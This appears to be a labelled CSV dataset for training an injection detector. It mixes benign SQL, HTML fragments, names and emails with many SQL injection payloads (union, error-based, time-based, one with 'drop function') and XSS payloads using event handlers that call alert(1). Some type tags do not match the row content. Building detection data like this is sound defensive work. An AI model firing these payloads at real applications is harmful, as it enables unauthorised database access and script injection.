Text,Label,type
"  SELECT lionID AS ID, mouse AS own FROM stomach",0,sql
SELECT * FROM command WHERE north = 'ear',0,xss
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rt>",2,xss
 or '1'  =  '1'--,1,xss
hache6,0,sql
SELECT * FROM point,0,sql
rasifo,0,sql
SELECT COUNT ( possibly )  FROM rose,0,sql
SELECT TOP 50 PERCENT * FROM needle SELECT * FROM week FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM guide,0,sql
"1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,sql
"<li><a href=""/wiki/Business_process_automation"" title=""Business process automation"">Business process automation </a> </li>",0,xss
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # twev,1,sql
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1,xss
SELECT * FROM naturally ORDER BY meal DESC,0,sql
1'||  (  select 'hwdj' where 8179  =  8179,1,sql
-2951 or 4189  =  2291,1,sql
SELECT * FROM copy  WHERE year NOT LIKE '[forget]%',0,xss
maycel,0,sql
"iif  (  1149  =  4765,1,1/0  )  ",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation arxiv"">Sutskever, Ilya; Vinyals, Oriol; Le, Quoc V. (2014). ""Sequence to Sequence Learning with Neural Networks"". <a href=""/wiki/ArXiv"" title=""ArXiv"">arXiv </a>:<span class=""cs1-lock-free"" title=""Freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1409.3215"">1409.3215 </a> ",0,xss
SELECT * FROM understanding WHERE contain = 'shine' FETCH FIRST 3 ROWS ONLY,0,sql
1'  )   and 4822  =  6997 and   (  'ojku'  =  'ojku,1,sql
"c/ rio cidacos, 13",0,sql
97925933y,0,sql
<tr onpointerover=alert(1)>XSS</tr>,2,xss
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,0,sql
SELECT DISTINCT activity FROM tax,0,sql
"  SELECT * FROM layers WHERE mostly NOT IN  ( 'roof', 'rain', 'soon' )  ",0,sql
"-8073   )    )     )   union all select 4481,4481,4481,4481--",1,xss
"   SELECT Orders.OrderID, Customers.CustomerName, Shippers.ShipperNameFROM     (  (  OrdersINNER JOIN Customers ON Orders.CustomerID  =  Customers.CustomerID )   INNER JOIN Shippers ON Orders.ShipperID  =  Shippers.ShipperID ) ;",0,sql
"-5731"" union all select 3083,3083,3083#",1,sql
<meta onpointerenter=alert(1)>XSS</meta>,2,xss
"SELECT column1 , column2, ... FROM table_name WHERE condition1 OR condition2 OR condition3 ... ;",0,sql
"   SELECT speed,exchange,gave,shown,above     (  (  orbit JOIN thought ON food.caught =  fought.does )   INNER JOIN mountainON Orders.somewhere =  under.betweenID ) ",0,sql
"<li><a href=""/wiki/Cyberwarfare"" title=""Cyberwarfare"">Cyberwarfare </a> </li>",0,xss
"   SELECT say,grade,wise,engine,post     (  (  arrangement JOIN date ON bright.known =  fish.writing )   INNER JOIN teamON Orders.even =  tune.morningID ) ",0,sql
"<td oncontextmenu=""alert(1)"">test</td>",2,xss
SELECT * FROM column  WHERE star NOT LIKE '[drawn]%',0,sql
<details id=x tabindex=1 onfocus=alert(1)></details>,2,xss
3690,0,sql
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,2,xss
" end and    (    (   ""cxoi""  =  ""cxoi",1,sql
"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",1,xss
or sleep  (  __TIME__  )  #,1,sql
7219,0,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_cell_number' LIMIT 1,0,sql
 or 3  =  3 --,1,sql
SELECT * FROM do WHERE moment = 'beneath',0,sql
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",2,xss
	 </span> ,0,xss
 or '7659'  =  '7659,1,sql
DELETE FROM charge,0,sql
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",2,xss
"1"" rlike sleep  (  5  )   and ""veub""  =  ""veub",1,xss
"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",1,sql
SELECT * FROM  ( SELECT rain FROM lion ) ,0,sql
swinton@voragolive.kz,0,sql
 UPDATE brick SET may = 'taste'WHERE score = 'key',0,xss
lasedad,0,sql
49211,0,sql
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',1,xss
jiinshuh,0,sql
"<meta oncut=""alert(1)"" contenteditable>test</meta>",2,xss
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",1,sql
SELECT headed ( s )  FROM threw FULL OUTER JOIN,0,sql
3675,0,sql
9751,0,sql
1  )   and   (  3020  =  3020  )  *6703,1,sql
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0,sql
"<base onmouseleave=""alert(1)"">test</base>",2,xss
m86uca,0,sql
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>,2,xss
"	 </span> <span class=""reference-text"">",0,xss
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'yctp'  =  'yctp,1,sql
decour raichs,0,sql
1'||  (  select 'flbv' where 7451  =  7451 and 4595  =  4595#,1,sql
"olivar, 174,",0,sql
SELECT main,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367676 )  ORDER BY meta_id ASC",0,sql
SELECT * FROM  ( SELECT trade FROM package ) ,0,xss
"SELECT column_name FROM table1 T1, table1 T2 WHERE condition ;",0,xss
"  SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )  ",0,sql
SELECT * FROM nothing WHERE social = 'simply' LIMIT 3,0,sql
SELECT Count ( * )  AS leave,0,xss
li74re04,0,sql
<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>,2,xss
"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",1,sql
"1  )   as ujjg where 3125  =  3125 union all select null,null,null,null,null,null#",1,sql
"silo 179, 12?b",0,sql
SELECT * FROM cell FETCH FIRST 50 PERCENT ROWS ONLY,0,xss
"-4798%'   )    )     )   union all select 3330,3330,3330#",1,sql
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2691,2767,2874 )  ORDER BY meta_id ASC",0,sql
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationstart=""alert(1)""></tt>",2,xss
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,2,xss
6.71861E+15,0,sql
5.69342E+15,0,sql
SELECT COUNT ( giantID ) FROM sick,0,sql
"<figcaption onmouseleave=""alert(1)"">test</figcaption>",2,xss
rascel-byatt@discotecateatre.ug,0,xss
SELECT * FROM thee WHERE shaking NOT LIKE '[kill]%',0,sql
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",1,sql
	 </span> </li>,0,xss
"  SELECT electric AS perhaps, see AS [like]  FROM hill",0,sql
"1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,sql
78218686x,0,sql
"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",1,sql
SELECT * FROM smooth WHERE lungs = 'gone',0,sql
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3#",1,sql
leyton@intg.tk,0,sql
"<code onbeforepaste=""alert(1)"" contenteditable>test</code>",2,xss
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,0,sql
"1"" and 9468  =  7105--",1,sql
"<li><a href=""/wiki/Mind%E2%80%93body_dualism"" title=""Mind–body dualism"">Mind–body dualism </a> </li>",0,xss
1 where 3027  =  3027 and 4595  =  4595#,1,sql
"<abbr onmousemove=""alert(1)"">test</abbr>",2,xss
SELECT * FROM flat WHERE drop BETWEEN pale09/01/1996weigh AND began15/31/1996known,0,sql
SELECT * FROM spent WHERE least = 'active' LIMIT 3,0,sql
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",1,sql
"<title onkeypress=""alert(1)"" contenteditable>test</title>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/api.html"">Core API</a></li>",0,xss
"1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||'",1,sql
mera alccer,0,sql
ars yermo,0,sql
 ,0,xss
"INSERT INTO shoe  ( shinning, serious, hearing )  VALUES  ( 'cheese', 'population', 'shirt' )  ",0,sql
marella,0,xss
1'+  (  select 'mxlb' where 4900  =  4900,1,xss
select * from users where id  =  '1' or $<\ or 1  =  1 -- 1',1,xss
SELECT * FROM  ( SELECT atomic FROM slipped ) ,0,xss
"c/ general merry del val, s/n",0,xss
	 </span> ,0,xss
particular teresa orozco 101,0,xss
16707,0,sql
SELECT * FROM  ( SELECT almost FROM rabbit ) ,0,xss
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',1,sql
end and   (  4610  =  4610,1,sql
 </li>,0,xss
d9str7par,0,sql
<table id=x tabindex=1 onfocus=alert(1)></table>,2,xss
"<li id=""cite_note-FOOTNOTEDomingos2015-152""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015_152-0"">^ </a> </b> ",0,xss
"-5313'  )   union all select 7187,7187,7187#",1,sql
"-6442""   )    )     )   or 3038  =  3038",1,xss
"<li><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://www-formal.stanford.edu/jmc/whatisai/node3.html"">""Applications of AI"" </a>. <i>www-formal.stanford.edu </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">25 September ",0,xss
<summary id=x tabindex=1 onactivate=alert(1)></summary>,2,xss
"	 </span></a> or <a class=""hoverxref reference internal"" data-doc=""py-modindex"" data-project=""scrapy"" data-section="""" data-version=""latest"" href=""py-modindex.html""><span class=""std std-ref"">Module Index",0,xss
3.09015E+15,0,sql
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""fvtu"" like ""fvtu",1,xss
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,2,xss
"SELECT * FROM tonight WHERE came BETWEEN ""zoo"" AND    ""symbol""",0,sql
DELETE FROM industrial WHERE welcome = 'comfortable',0,sql
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1,sql
"<audio onmouseout=""alert(1)"">test</audio>",2,xss
SELECT TOP 3 * FROM amount,0,sql
SELECT * FROM larger ORDER BY involved DESC,0,sql
SELECT * FROM leader WHERE stairs BETWEEN '1996-07-01' AND '1996-07-31',0,sql
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,sql
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",2,xss
cerpa oitavn,0,sql
"<noframes onmouseup=""alert(1)"">test</noframes>",2,xss
SELECT * FROM toward WHERE valuable = 'health'  AND City = 'knowledge',0,sql
6o40o41,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Gallagher, James (26 January 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/health-38717928"">""Artificial intelligence 'as good as cancer doctors<span class=""cs1-kern-right"">' ",0,xss
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",1,sql
<track onpointerout=alert(1)>XSS</track>,2,xss
SELECT sing ( s )  FROM engineer FULL OUTER JOIN,0,sql
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,xss
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
SELECT * FROM steep 3 SELECT * FROM dangerous,0,xss
"<mark onmouseup=""alert(1)"">test</mark>",2,xss
<meter onpointerout=alert(1)>XSS</meter>,2,xss
SELECT TOP 3 * FROM sharp SELECT * FROM quarter 3SELECT * FROM football,0,sql
SELECT citizen ( s )  FROM news SELECT distant FROM hall,0,xss
59760678p,0,sql
"<caption onkeydown=""alert(1)"" contenteditable>test</caption>",2,xss
"  <div class=""rst-versions"" data-toggle=""rst-versions"" role=""note"" aria-label=""versions"">",0,xss
" SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0,sql
"   SELECT opportunity, ear, potFROM fat WHERE four  IS NOT NULL",0,sql
SELECT * FROM write ORDER BY slave DESC,0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">Philosophy of </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0,xss
SELECT * FROM national WHERE nervous NOT LIKE 'exercise%',0,sql
SELECT COUNT ( sinkID ) FROM sudden,0,sql
SELECT DISTINCT year FROM ground,0,xss
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>",2,xss
"<svg onkeypress=""alert(1)"" contenteditable>test</svg>",2,xss
SELECT TOP 3 * FROM night,0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """,1,sql
" SELECT * FROM equipment ORDER BY rhythm, least",0,sql
SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) ,0,sql
"	 </span> </a> </i>&#93; </sup>. Its goal is to memorize all the papers necessary to cancer and help predict which combinations of drugs will be most effective for each patient. One project that is being worked on at the moment is fighting <a href=""/wiki/Acute_myeloid_leukemia"" title=""Acute myeloid leukemia"">myeloid leukemia </a>, a fatal cancer where the treatment has not improved in decades. Another study was reported to have found that artificial intelligence was as good as trained doctors in identifying skin cancers.<sup id=""cite_ref-302"" class=""reference""><a href=""#cite_note-302"">&#91;291&#93; </a> </sup> Another study is using artificial intelligence to try to monitor multiple high-risk patients, and this is done by asking each patient numerous questions based on data acquired from live doctor to patient interactions.<sup id=""cite_ref-303"" class=""reference""><a href=""#cite_note-303"">&#91;292&#93; </a> </sup> One study was done with transfer learning, the machine performed a diagnosis similarly to a well-trained ophthalmologist, and could generate a decision within 30 seconds on whether or not the patient should be referred for treatment, with more than 95% accuracy.<sup id=""cite_ref-304"" class=""reference""><a href=""#cite_note-304"">&#91;293&#93; </a> </sup>",0,xss
SELECT * FROM  ( SELECT interior FROM unusual ) ,0,xss
"<li><a href=""/wiki/Testability"" title=""Testability"">Testability </a> </li>",0,xss
<source onpointerup=alert(1)>XSS</source>,2,xss
causa,0,sql
"              <div class=""version"">",0,xss
SELECT TOP 50 PERCENT * FROM oxygen,0,sql
SELECT TOP 3 * FROM send WHERE birth = 'hollow' SELECT * FROM liquid,0,sql
DELETE FROM mile,0,xss
"1   )    )    as avdz where 1881  =  1881 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
SELECT * FROM meant  WHERE post NOT LIKE '[hour]%',0,sql
"-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '",1,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",2,xss
SELECT COUNT ( whom ) FROM inside,0,sql
"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad",1,xss
"-2377%'   )    )     )   union all select 7706,7706--",1,sql
"   SELECT check, whistle+ ', ' + useful+ ' ' + mission+ ', ' + swimming AS ordinary  FROM family",0,sql
DELETE FROM mood WHERE folks = 'record',0,xss
"   SELECT anybody, church+ ', ' + parent+ ' ' + men+ ', ' + whenever AS suppose  FROM industrial",0,xss
SELECT * FROM shall WHERE feel BETWEEN 'phrase' AND 'hope',0,xss
marlowe,0,sql
1   )    )    as xroy where 3274  =  3274,1,sql
-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,1,sql
02879028a,0,sql
"1'||  (  select 'osux' from dual where 7066  =  7066 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,sql
.lapidosa,0,sql
1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',1,sql
SELECT difference,0,sql
SELECT * FROM wp_posts WHERE ID  =  348623 LIMIT 1,0,sql
SELECT * FROM seat FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM generally,0,sql
"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,sql
"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1,sql
"1  )   as ihan where 5298  =  5298 and elt  (  6587  =  3479,3479  )  --",1,sql
84638109h,0,sql
6382,0,sql
lloros*o,0,sql
"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",1,sql
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationstart=""alert(1)""></video>",2,xss
73502486y,0,sql
"1""  )   union all select null,null,null,null--",1,sql
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,1,sql
"<dir onmouseover=""alert(1)"">test</dir>",2,xss
"  SELECT IF ( 500<1000, 5, 10 ) ;",0,sql
"<div class=""section"" id=""first-steps"">",0,xss
<content id=x tabindex=1 onfocusin=alert(1)></content>,2,xss
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",1,xss
"  SELECT fox AS north, ahead AS [each]  FROM office",0,sql
	 </span>,0,xss
fresia,0,sql
lemin@11horas.mz,0,sql
"  SELECT factID AS ID, manufacturing AS weak FROM round",0,sql
	 </span> </li>,0,xss
1'  )   and   (  7603  =  3634  )  *3634,1,sql
	 </span></a></dt><dd>Get Scrapy installed on your computer.</dd>,0,xss
SELECT COUNT ( author ) FROM bear,0,xss
"<li>if your opponent has played in a corner, take the opposite corner. Otherwise, </li>",0,xss
SELECT * FROM slowly WHERE metal BETWEEN '1996-07-01' AND '1996-07-31',0,xss
FROM  ( SELECT DISTINCT rhyme FROM around ) ,0,sql
c/ moriles 91,0,xss
mandayona,0,sql
SELECT * FROM shaking WHERE period = 'met'  OR field = 'smoke',0,sql
"1' where 7464  =  7464 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
SELECT COUNT ( least ) FROM massage,0,sql
SELECT * FROM black ORDER BY seven,0,sql
"1"" where 7796  =  7796",1,sql
35231,0,sql
"<u onmouseout=""alert(1)"">test</u>",2,xss
terraje,0,sql
1'||  (  select 'lnhq' where 7526  =  7526,1,sql
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,xss
miriamne,0,sql
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  ""snwx"" like ""snwx",1,sql
SELECT * FROM however FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM bread,0,sql
if  (  8537  =  7034  )   select 8537 else drop function vqmp--,1,sql
SELECT AVG ( third ) FROM tool SELECT SUM ( not ) ,0,sql
SELECT AVG ( too ) FROM buffalo,0,sql
SELECT DISTINCT satisfied FROM root,0,sql
